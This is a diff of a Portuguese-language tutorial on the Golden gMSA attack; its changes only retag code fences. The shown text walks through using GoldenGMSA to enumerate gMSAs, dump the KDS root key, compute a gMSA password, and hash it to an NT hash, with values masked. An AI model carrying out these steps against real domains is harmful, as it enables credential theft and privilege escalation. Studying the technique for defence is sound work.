@@ -48,7 +48,7 @@ Se a **gMSA** tiver privilégios elevados, o invasor pode usá-la pra compromete
 Como eu disse ali em cima, podemos usar a ferramenta [GoldenGMSA](https://github.com/Semperis/GoldenGMSA) da Semperis Inc. pra nos ajudar no ato.
 
 De inicio podemos usar a operação `gmsainfo`, essa operação enumera os gMSAs em um domínio e lista seu nome, SID, KDS root key associada e um BLOB em Base64 que representa sua `msDS-ManagedPasswordID`.
-```swift=
+```powershell
 PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe gmsainfo
 SamAccountName:         gmsaAD$          <-- nome de logon
 ObjectSID:              S-1-5-21-x-x-x-x <-- Security IDentifier
@@ -57,7 +57,7 @@ msds-ManagedPasswordID: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
                         ^^^^ PasswordID já explicado anteriormente
 ```
 como você pode ver, a operação `gmsainfo` nos mostrou o BLOB em Base64, mas não podemos fazer nada só com isso, pra gerar a senha da gMSA precisa da root key do KDS também, e podemos fazer isso com a operação `kdsinfo`.
-```swift=
+```powershell
 PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe kdsinfo
 Guid:           x-x-x-x-x          <-- rootkey
 Base64 blob:    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
@@ -68,7 +68,7 @@ agora que já temos a Root Key e os atributos necessários da gMSA, podemos usar
 Como a senha é gerada **aleatoriamente** e **geralmente** não é usada por usuários reais e sim por scripts, a senha é muito longa e complexa e tem caracteres incomuns, então o **GoldenGMSA** codifica a senha em **Base64**.
 
 Podemos providenciar todos os atributos da gMSA e conseguir a senha em Base64 
-```swift=
+```powershell
 PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe compute --sid S-1-5-21-x-x-x-x --kdskey XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX --pwdid XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 
 ----- Argumentos:
@@ -79,7 +79,7 @@ PS C:\Users\Administrator\Desktop> .\GoldenGMSA.exe compute --sid S-1-5-21-x-x-x
 Base64 Encoded Password:       XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
 Agora temos a senha da gMSA em Base64, podemos também computar sua hash NT/MD4 com este script simples.
-```py=
+```python
 import hashlib, base64
 print("[+] MD4 ->", hashlib.new("md4", base64.b64decode(COLOCA O BASE64 ENTRE ESSES PARENTESES)).hexdigest())
 ```
